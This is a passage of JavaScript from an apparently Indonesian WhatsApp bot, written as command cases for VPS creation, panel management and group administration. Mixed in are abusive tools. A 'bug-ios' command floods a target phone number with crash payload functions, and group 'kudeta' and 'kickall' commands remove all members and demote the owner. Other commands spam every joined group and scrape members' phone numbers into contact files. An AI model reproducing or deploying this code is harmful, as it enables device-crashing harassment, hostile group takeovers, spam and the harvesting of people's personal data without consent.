            return new Error(`Onii-chan, *Gagal membuat VPS:* ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Onii-chan, *Terjadi kesalahan saat membuat VPS:* ${err}`);
    }
}
break;

case 'vps4g2c': {
    if (!isOwner) return reply(`Onii-chan, *apalah* 😏`);

    let hostname = args[0];
    if (!hostname) return reply(`Onii-chan, *Masukkan hostname VPSnya!*`);

    try {
        let dropletData = {
            name: hostname,
            region: 'sgp1',
            size: 's-2vcpu-4gb',
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['MikkuBot']
        };

        let password = generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + apido
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            reply(`Onii-chan, *Tunggu Sebentar...* ⏳`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + apido
                }
            });

            let dropletData = await dropletResponse.json();
            // Memeriksa apakah ada alamat IP VPS yang tersedia
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

            let messageText = `✨ VPS berhasil dibuat! ✨\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}\n`;

            await tamzz.sendMessage(m.chat, { text: messageText });
        } else {
            return new Error(`Onii-chan, *Gagal membuat VPS:* ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Onii-chan, *Terjadi kesalahan saat membuat VPS:* ${err}`);
    }
}
break;


case 'vps8g4c': {
    if (!isOwner) return reply(`Onii-chan, *apalah* 😏`);

    let hostname = args[0];
    if (!hostname) return reply(`Onii-chan, *Masukkan hostname VPSnya!*`);

    try {
        let dropletData = {
            name: hostname,
            region: 'sgp1',
            size: 's-4vcpu-8gb',
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['MikkuBot']
        };

        let password = generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + apido
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            reply(`Onii-chan, *Tunggu Sebentar...* ⏳`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + apido
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

            let messageText = `✨ VPS berhasil dibuat! ✨\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}\n`;

            await tamzz.sendMessage(m.chat, { text: messageText });
        } else {
            return new Error(`Onii-chan, *Gagal membuat VPS:* ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Onii-chan, *Terjadi kesalahan saat membuat VPS:* ${err}`);
    }
}
break;

case 'vps16g4c': {
    if (!isOwner) return reply(`Onii-chan, *apalah* 😏`);

    let hostname = args[0];
    if (!hostname) return reply(`Onii-chan, *Masukkan hostname VPSnya!*`);

    try {
        let dropletData = {
            name: hostname,
            region: 'nyc3',
            size: 's-4vcpu-16gb-amd',
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['MikkuBot']
        };

        let password = generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + apido
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            reply(`Onii-chan, *Tunggu Sebentar...* ⏳`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + apido
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia!";

            let messageText = `✨ VPS berhasil dibuat! ✨\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}\n`;

            await tamzz.sendMessage(m.chat, { text: messageText });
        } else {
            return new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Onii-chan, *Terjadi kesalahan saat membuat VPS:* ${err}`);
    }
}
break;


case 'addsaldo': {
    if (!isOwner) return reply(`Onii-chan, *Hanya Owner yang bisa menggunakan ini!* 😤`);
    if (!text) return reply(`Ex: ${prefix + command} Nomor|Jumlah\n\nContoh:\n${prefix + command} 628817839722|20000`);
    if (!q.split("|")[0]) return reply(`Ex: ${prefix + command} Nomor|Jumlah\n\nContoh:\n${prefix + command} 628817839722|20000`);
    if (!q.split("|")[1]) return reply(`Ex: ${prefix + command} Nomor|Jumlah\n\nContoh:\n${prefix + command} 628817839722|20000`);
    
    addSaldo(`${q.split("|")[0]}@s.whatsapp.net`, Number(q.split("|")[1]), db_saldo);
    await sleep(50);
    
    tamzz.sendTextMentions(from, `「 *SALDO USER* 」
⭔ID: ${q.split("|")[0]}
⭔Nomer: @${q.split("|")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(`${q.split("|")[0]}@s.whatsapp.net`, db_saldo))}`, [q.split("|")[0] + "@s.whatsapp.net"]);
    
    tamzz.sendTextMentions(`${q.split("|")[0]}@s.whatsapp.net`, `「 *SALDO USER* 」
⭔ID: ${q.split("|")[0]}
⭔Nomer: @${q.split("|")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(`${q.split("|")[0]}@s.whatsapp.net`, db_saldo))}`, [q.split("|")[0] + "@s.whatsapp.net"]);
}
break;


case "startjpm": {
    if (!isOwner) return m.reply(`Onii-chan, *Hanya Owner yang bisa menggunakan ini!* 😤`);
    
    var teksnya = await fs.readFileSync("./all/database/teksjpm.js").toString();
    if (teksnya.length < 1) return m.reply(`Onii-chan, *Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database* 📜`);
    
    var teks = `${teksnya}`;
    let total = 0;
    let getGroups = await tamzz.groupFetchAllParticipating();
    let usergc = await Object.keys(getGroups);
    
    m.reply(`Onii-chan, *Memproses Mengirim Pesan Text Ke ${usergc.length} Grup* 📬`);
    
    for (let jid of usergc) {
        try {
            await tamzz.sendMessage(jid, { text: teks }, { quoted: qpayment });
            total += 1;
        } catch {}
        await sleep(4000);
    }
    
    m.reply(`Onii-chan, *Berhasil Mengirim Pesan Ke ${total} Grup* 🎉`);
}
break;


case "savekontak2": {
    if (!isOwner) return m.reply(`Onii-chan, *Hanya Owner yang bisa menggunakan ini!* 😤`);
    if (!text) return m.reply(`Onii-chan, *id grupnya*\n\n*ketik *.listgc* untuk melihat semua list id grup* 📜`);

    var idnya = text;
    var groupMetadataa;
    try {
        groupMetadataa = await tamzz.groupMetadata(`${idnya}`);
    } catch (e) {
        return m.reply(`*ID Grup* tidak valid! ❌`);
    }
    
    const participants = await groupMetadataa.participants;
    const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
    
    for (let mem of halls) {
        if (mem !== m.sender) {
            contacts.push(mem);
            fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts));
        }
    }
    
    try {
        const uniqueContacts = [...new Set(contacts)];
        const vcardContent = uniqueContacts.map((contact) => {
            const vcard = [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
                `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                "END:VCARD",
                "", 
            ].join("\n");
            return vcard;
        }).join("");
        
        fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
    } catch (err) {
        m.reply(`Onii-chan, *Terjadi kesalahan: ${err.toString()}* 😢`);
    } finally {
        if (m.chat !== m.sender) await m.reply(`Onii-chan, *File Kontak Berhasil Dikirim ke Private Chat* ✉️`);
        
        await tamzz.sendMessage(m.sender, { 
            document: fs.readFileSync("./all/database/contacts.vcf"), 
            fileName: "contacts.vcf", 
            caption: "File Kontak Berhasil Di Buat ✅", 
            mimetype: "text/vcard", 
        }, { quoted: qpayment });
        
        contacts.splice(0, contacts.length);
        await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts));
        await fs.writeFileSync("./all/database/contacts.vcf", "");
    }
}
break;


case 'shortlink': {
    if (!text) return reply(`*[ Wrong! ]* Onii-chan, *harap masukan link/url* 📜`);

    let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
    if (!shortUrl1) return reply(`*Error: Could not generate a short URL.* 😢`);

    let done = `*[ S U C C E S S   P R O C E S S ]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
    reply(done);
}
break;


case 'unsuspend2': {
    if (!isOwner) return reply(`Onii-chan, *Sory Cik Lu Siapa Bjirr* 😏`);
    
    let srv = args[0];
    if (!srv) return reply(`Onii-chan, *ID-nya mana?* 📜`);
    
    let f = await fetch(`${domain2}/api/application/servers/${srv}/unsuspend`, {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": `Bearer ${apikey2}`
        }
    });
    
    let res = f.ok ? {
        errors: null
    } : await f.json();
    
    if (res.errors) return reply(`*SERVER NOT FOUND* 😢`);
    
    reply(`*BERHASIL BUKA SUSPEND..* 🎉`);
}
break;
            
            
case 'unsuspend': {
    if (!isOwner) return reply(`Onii-chan, *Sory Cik Lu Siapa Bjirr* 😏`);
    
    let srv = args[0];
    if (!srv) return reply(`Onii-chan, *ID-nya mana?* 📜`);
    
    let f = await fetch(domain2 + "/api/application/servers/" + srv + "/unsuspend", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    
    let res = f.ok ? {
        errors: null
    } : await f.json();
    
    if (res.errors) return reply(`*SERVER NOT FOUND* 😢`);
    
    reply('*BERHASIL BUKA SUSPEND..* 🎉');
}
break;
            
            
case "savekontak": {
    if (!isOwner) return m.reply(`Onii-chan, *Hanya Owner yang bisa menggunakan ini!* 😤`);
    if (!isGroup) return m.reply(`Onii-chan, *ini hanya bisa dilakukan di grup!* 📜`);

    const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
    
    for (let mem of halls) {
        if (mem !== m.sender) {
            contacts.push(mem);
            fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts));
        }
    }
    
    try {
        const uniqueContacts = [...new Set(contacts)];
        const vcardContent = uniqueContacts.map((contact) => {
            const vcard = [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
                `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                "END:VCARD",
                "", 
            ].join("\n");
            return vcard;
        }).join("");
        
        fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
    } catch (err) {
        m.reply(`Onii-chan, *Terjadi kesalahan: ${err.toString()}*`);
    } finally {
        if (m.chat !== m.sender) await m.reply(`Onii-chan, *File Kontak Berhasil Dikirim ke Private Chat*`);
        
        await tamzz.sendMessage(m.sender, { 
            document: fs.readFileSync("./all/database/contacts.vcf"), 
            fileName: "contacts.vcf", 
            caption: "File Kontak Berhasil Di Buat ✅", 
            mimetype: "text/vcard", 
        }, { quoted: qpayment });
        
        contacts.splice(0, contacts.length);
        await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts));
        await fs.writeFileSync("./all/database/contacts.vcf", "");
    }
}
break;


case 'kudeta': {
    if (!isGroup) return m.reply(`Onii-chan, *ini hanya bisa dilakukan di grup!* 📜`);
    if (!isAdmins) return m.reply(`Onii-chan, *hanya admin yang bisa melakukan ini!* 😤`);
    if (!isBotAdmins) return m.reply(`Onii-chan, *bot harus menjadi admin terlebih dahulu!* 🤖`);
    
    m.reply(`*BERHASIL KUDETA GRUB ✅*`);
    let data = participants.map((o) => o.id);
    
    for (let o of data) {
        if (o !== botNumber && o !== groupOwner && o !== global.owner) {
            tamzz.groupParticipantsUpdate(m.chat, [o], "remove");
        } else if (data.includes(groupOwner)) {
            setTimeout(() => {
                tamzz.groupParticipantsUpdate(m.chat, [groupOwner], "remove");
            }, 1);
            tamzz.groupParticipantsUpdate(m.chat, [groupOwner], "demote");
        }
    }
}
break;


case 'listdrop': {
    if (!isOwner) return ("Onii-chan, *apalah 😏*");
    try {
        const getDroplets = async () => {
            try {
                const response = await fetch('https://api.digitalocean.com/v2/droplets', {
                    headers: {
                        Authorization: "Bearer " + apido
                    }
                });
                const data = await response.json();
                return data.droplets || [];
            } catch (err) {
                reply(`Onii-chan, *Error fetching droplets: ${err}*`);
                return [];
            }
        };

        getDroplets().then(droplets => {
            let totalvps = droplets.length;
            let mesej = `🌟 List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

            if (droplets.length === 0) {
                mesej += '*Tidak ada droplet yang tersedia!*';
            } else {
                droplets.forEach(droplet => {
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                    mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- CPU: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
                });
            }
            tamzz.sendMessage(m.chat, { text: mesej });
        });
    } catch (err) {
        reply(`Onii-chan, *Terjadi kesalahan saat mengambil data droplet: ${err}*`);
    }
}
break;


case "jpmpromosi": case "jpmpromo": case "jpm3": {
    if (!isOwner) return reply(`Onii-chan, *Hanya Owner yang bisa menggunakan ini!* 😤`);
    if (!text && !m.quoted) return m.reply(`Onii-chan, *teksnya atau reply teks!* 📜`);
    
    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;
    let getGroups = await tamzz.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let usergc = groups.map((v) => v.id);
    
    m.reply(`⏳ Memproses Mengirim Pesan Ke *${usergc.length} Grup*`);
    
    let teksnya = teks;
    let msgii = generateWAMessageFromContent(m.chat, { 
        viewOnceMessage: { 
            message: { 
                "messageContextInfo": { 
                    "deviceListMetadata": {}, 
                    "deviceListMetadataVersion": 2
                }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: { 
                        mentionedJid: [m.sender], 
                        externalAdReply: {
                            showAdAttribution: true 
                        }
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({ 
                        text: teksnya 
                    }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
                        }]
                    }) 
                }) 
            } 
        } 
    }, { userJid: m.sender, quoted: qpayment });
    
    for (let jid of usergc) {
        try {
            await tamzz.relayMessage(jid, msgii.message, { 
                messageId: msgii.key.id 
            });
            total += 1;
        } catch {}
        await sleep(global.delayjpm);
    }
    
    m.reply(`🎉 Berhasil Mengirim Pesan Ke *${total} Grup*`);
}
break;


case 'pushmember': case 'jpm': {
    if (!isOwner) return reply(`Onii-chan, *Hanya Owner yang bisa menggunakan ini!* 😤`);
    if (!text) return reply(`Onii-chan, *Teksnya Mana Bang?* 📜`);
    
    let getGroups = await tamzz.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
    let tamz = groups.map(v => v.id);
    
    reply(`⏳ *Sedang ${command} Ke ${tamz.length} Group*, *Mohon Bersabar Dan Jeda Biar Gak Kenon!*`);
    
    for (let i of tamz) {
        await sleep(global.delayjpm);
        let txt = `${text}`;
        
        tamzz.sendMessage(i, {
            text: txt,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true, 
                    title: `ϝαԃȥʋρɳ`,
                    body: namaCreator,
                    thumbnailUrl: "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg",
                    sourceUrl: "https://chat.whatsapp.com/IAvxLU8KWknAYJngDXOctu",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
    }
    
    reply(`🎉 *Sukses ${command} Ke ${tamz.length} Group*`);
}
break;


case "jpmtesti": {
    if (!isOwner) return reply(`Onii-chan, *Hanya Owner yang bisa menggunakan ini!* 😤`);
    if (!text) return m.reply(`Onii-chan, *teksnya dengan balas/kirim foto!* 📸`);
    if (!/image/.test(mime)) return m.reply(`Onii-chan, *teksnya dengan balas/kirim foto!* 📸`);
    
    let image = await tamzz.downloadAndSaveMediaMessage(qmsg);
    if (global.idsaluran == "-") return m.reply(`Onii-chan, *Isi Dulu ID Saluran Lu Di File Settings.js!*`);
    
    let total = 0;
    let getGroups = await tamzz.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let usergc = groups.map((v) => v.id);
    
    m.reply(`⏳ Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`);
    
    let msgii = generateWAMessageFromContent(m.chat, { 
        viewOnceMessage: { 
            message: { 
                "messageContextInfo": { 
                    "deviceListMetadata": {}, 
                    "deviceListMetadataVersion": 2
                }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: { 
                        mentionedJid: [m.sender], 
                        externalAdReply: {
                            showAdAttribution: true 
                        }
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({ 
                        text: text 
                    }), 
                    header: proto.Message.InteractiveMessage.Header.create({ 
                        hasMediaAttachment: true, 
                        ...(await prepareWAMessageMedia({ image: await fs.readFileSync(image) }, { upload: tamzz.waUploadToServer })) 
                    }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
                        }]
                    }) 
                }) 
            } 
        } 
    }, { userJid: m.sender, quoted: qpayment });
    
    for (let jid of usergc) {
        try {
            await tamzz.relayMessage(jid, msgii.message, { 
                messageId: msgii.key.id 
            });
            total += 1;
        } catch {}
        await sleep(global.delayjpm);
    }
    
    await fs.unlinkSync(image);
    m.reply(`🎉 Berhasil Mengirim Postingan Ke *${total} Grup*`);
}
break;


case "detusr": {
    if (!isOwner) return reply(`Onii-chan, *Lu Siape? Fitur Ini Khusus Owner Gw!* 😤`);
    
    let usr = args[0];
    let f = await fetch(domain + "/api/application/users/" + usr, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });
    
    let res = await f.json();
    if (res.errors) return reply2(`*USER NOT FOUND* 😢`);
    
    let u = res.attributes;
    let teks = `*${u.username.toUpperCase()} USER DETAILS* 🌟

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``;

    let msgii = generateWAMessageFromContent(m.chat, { 
        viewOnceMessage: { 
            message: { 
                "messageContextInfo": { 
                    "deviceListMetadata": {}, 
                    "deviceListMetadataVersion": 2
                }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: { 
                        mentionedJid: [m.sender] 
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({ 
                        text: teks 
                    }), 
                    footer: proto.Message.InteractiveMessage.Footer.create({ 
                        text: global.foother 
                    }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [{
                            "name": "quick_reply", 
                            "buttonParamsJson": `{\"display_text\":\"Delete User\",\"title\":\"Delete User Panel\",\"id\":\".delusr ${u.id}\"}`
                        }]
                    }) 
                }) 
            } 
        } 
    }, {userJid: m.sender, quoted: qpayment}); 

    await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
        messageId: msgii.key.id 
    });
}
break;


case "detusr2": {
    if (!isOwner) return reply(`Onii-chan, *Lu Siape? Fitur Ini Khusus Owner Gw!* 😤`);
    
    let usr = args[0];
    let f = await fetch(domain2 + "/api/application/users/" + usr, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    
    let res = await f.json();
    if (res.errors) return reply(`*USER NOT FOUND* 😢`);
    
    let u = res.attributes;
    let teks = `*${u.username.toUpperCase()} USER DETAILS* 🌟

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``;

    let msgii = generateWAMessageFromContent(m.chat, { 
        viewOnceMessage: { 
            message: { 
                "messageContextInfo": { 
                    "deviceListMetadata": {}, 
                    "deviceListMetadataVersion": 2
                }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: { 
                        mentionedJid: [m.sender] 
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({ 
                        text: teks 
                    }), 
                    footer: proto.Message.InteractiveMessage.Footer.create({ 
                        text: 'tamz' 
                    }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [{
                            "name": "quick_reply", 
                            "buttonParamsJson": `{\"display_text\":\"Delete User\",\"title\":\"Delete User Panel\",\"id\":\".delusr ${u.id}\"}`
                        }]
                    }) 
                }) 
            } 
        } 
    }, {userJid: m.sender, quoted: qpayment}); 

    await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
        messageId: msgii.key.id 
    });
}
break;


case 'kickall': {
    if (!isOwner) return reply(`Onii-chan, hanya pemilik yang bisa menggunakan ini! 😤`);
    if (!m.isGroup) return reply(`Onii-chan, perintah ini khusus untuk grup! 🌟`);
    if (!isBotAdmins) return reply(`Onii-chan, bot belum menjadi admin! ⚠️`);
    if (!isAdmins) return reply(`Onii-chan, perintah ini hanya untuk admin!`);

    var groupe = await tamzz.groupMetadata(from);
    var members = groupe['participants'];
    var mems = [];

    members.map(adm => {
        mems.push(adm.id.replace('c.us', 's.whatsapp.net'));
    });

    tamzz.groupParticipantsUpdate(from, mems, 'remove');
    reply(`👋 Semua anggota telah dikeluarkan dari grup oleh Onii-chan!`);
}
break;


case 'opentime': {
    if (!m.isGroup) return reply(`Onii-chan, ini khusus untuk grup! 🌟`);
    if (!isAdmins) return reply(`Onii-chan, hanya admin yang bisa menggunakan ini! 😏`);
    if (!isBotAdmins) return reply(`Onii-chan, bot belum menjadi admin! ⚠️`);

    let timer;
    if (args[1] == 'second') {
        timer = args[0] * 1000;
    } else if (args[1] == 'minute') {
        timer = args[0] * 60000;
    } else if (args[1] == 'hour') {
        timer = args[0] * 3600000;
    } else if (args[1] == 'day') {
        timer = args[0] * 86400000;
    } else {
        return reply(`*Pilih:*\nsecond\nminute\nhour\nday\n\n*Contoh*\n10 second`);
    }

    reply(`⏳ Open Time ${q} dimulai dari sekarang, Onii-chan!`);
    
    setTimeout(() => {
        const nomor = m.participant;
        const open = `*Waktunya tiba* 🌟 Group dibuka oleh Admin\nSekarang anggota bisa mengirim pesan`;
        tamzz.groupSettingUpdate(from, 'not_announcement');
        reply(open);
    }, timer);
}
break;

case 'bug-ios': case 'bug-ipong': {
    if (!isOwner && !isMurbug) return m.reply(`Onii-chan, maaf perintah ini khusus untuk pengguna Murbug! Bergabunglah dengan Murbug dulu baru bisa akses 😈`);
    if (!isGroup) return m.reply(`Onii-chan, gunakan bug ini di dalam grup Murbug owner kami!`);

    if (!text) return m.reply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300 detik`);
    
    let ppek = text.split("|")[0];
    let bijipler = ppek.replace(/[^0-9]/g, "");
    
    if (bijipler.startsWith('0')) return m.reply(`<!> Nomor harus diawali dengan kode negara\n\n<✓> Contoh: .${command} 6287392784527|1`);

    let target = bijipler + "@s.whatsapp.net";
    let jumlah = q.split("|")[1] * 200;
    let ppk = jumlah * 1.5;

    m.reply(ppk + " detik");
    m.reply('_Tunggu sebentar, sedang mengirim Onii Chan..._');

    for (let j = 0; j < jumlah; j++) {
        await baklis(target, ryobug);
        await ngeloc(target, force);
        await pirgam(target, ryobug);
        await ngeloc(target, force);
        await penghitaman(target, force2);
        await ngeloc(target, force);
        await baklis(target, ryobug);
        await ngeloc(target, force);
        await pirgam(target, ryobug);
        await ngeloc(target, force);
        await penghitaman(target, force2);
        await ngeloc(target, force);
        await baklis(target, ryobug);
        await ngeloc(target, force);
        await pirgam(target, ryobug);
        await ngeloc(target, force);
        await penghitaman(target, force2);
        await ngeloc(target, force);
        await aipong(target);
        await sleep(1500);
    }

    m.reply(`👤 Sukses mengirim bug ke ${target} dalam kurun waktu ${ppk} detik! 🎉`);
}
break;


case 'closetime': {
    if (!m.isGroup) return reply(`Onii-chan, ini khusus untuk group! 🌟`);
    if (!isOwner) return reply(`Onii-chan, hanya creator yang bisa menggunakan ini! 😏`);
    if (!isBotAdmins) return reply(`Onii-chan, bot belum menjadi admin! ⚠️`);

    let timer;
    if (args[1] == 'second') {
        timer = args[0] * 1000;
    } else if (args[1] == 'minute') {
        timer = args[0] * 60000;
    } else if (args[1] == 'hour') {
        timer = args[0] * 3600000;
    } else if (args[1] == 'day') {
        timer = args[0] * 86400000;
    } else {
        return reply(`*Pilih:*\nsecond\nminute\nhour\nday\n\n*Contoh*\n10 second`);
    }

    reply(`⏳ Close Time ${q} dimulai dari sekarang, Onii-chan!`);
    
    setTimeout(() => {
        const nomor = m.participant;
        const close = `*Waktunya tiba* 🌟 Group ditutup oleh Admin\nSekarang hanya Admin yang bisa mengirim pesan`;
        tamzz.groupSettingUpdate(from, 'announcement');
        reply(close);
    }, timer);
}
break;


case "idgc": {
if (!isOwner) return m.reply(mess.only.owner)
if (!isGroup) return m.reply(mess.only.group)
m.reply(`${m.chat}`)
}
break


case 'delcase': {
    if (!isOwner) return reply(`Onii-chan, *Access Denied ❌*\n\n*Hanya pemilik yang bisa menggunakan ini!*`);
    if (!text) return reply(`Onii-chan, *masukkan nama case yang akan dihapus*`);

    dellCase('./tamzhost.js', q);
    reply(`Yay! *Dellcase berhasil, Onii-chan!* 🎉✨`);
}
break;


case "addowner": {
    if (!isOwner) return reply(`Onii-chan, hanya pemilik yang bisa menggunakan ini! 😏`);
    if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 6285727035336~`);

    bnnd = q.split("|")[0].replace(/[^0-9]/g, '');
    let ceknye = await tamzz.onWhatsApp(bnnd + `@s.whatsapp.net`);
    
    if (ceknye.length == 0) return reply(`Onii-chan, masukkan nomor yang valid dan terdaftar di WhatsApp!!! 💔`);

    ownerNumber.push(bnnd);
    fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber));
    reply(`Yay! Nomor ${bnnd} telah menjadi owner, Onii-chan! 🎉✨`);
}
break;


case "addowner2": {
    if (!isOwner) return reply(`Onii-chan, hanya pemilik yang bisa menggunakan ini! 😏`);
    if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 6285727035336~`);

    bnnd = q.split("|")[0].replace(/[^0-9]/g, '');
    let ceknye2 = await tamzz.onWhatsApp(bnnd + `@s.whatsapp.net`);
    
